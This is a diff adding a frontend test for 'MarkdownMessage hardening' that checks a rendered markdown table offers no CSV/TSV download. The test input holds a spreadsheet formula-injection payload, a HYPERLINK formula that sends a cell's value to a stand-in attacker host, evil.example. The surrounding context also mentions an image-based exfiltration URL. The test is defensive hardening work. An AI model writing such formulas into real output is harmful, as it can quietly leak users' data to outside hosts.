@@ -30,4 +30,13 @@ describe("MarkdownMessage hardening (M-26)", () => {
     expect(w.html()).not.toContain("evil.example/p.png");
     w.unmount();
   }, 30_000); // the real renderer loads its node components on first use
+
+  // F73: the library's CSV/TSV table download does no formula neutralisation.
+  it("offers no table download for model-written cells", async () => {
+    const w = await render('| a | b |\n|---|---|\n| =HYPERLINK("https://evil.example/?"&A2,"x") | 2 |\n');
+    expect(w.find("table").exists()).toBe(true);
+    expect(w.find('[labelkey="button.copy"]').exists()).toBe(true);
+    expect(w.find('[labelkey="button.download"]').exists()).toBe(false);
+    w.unmount();
+  }, 30_000);
 });
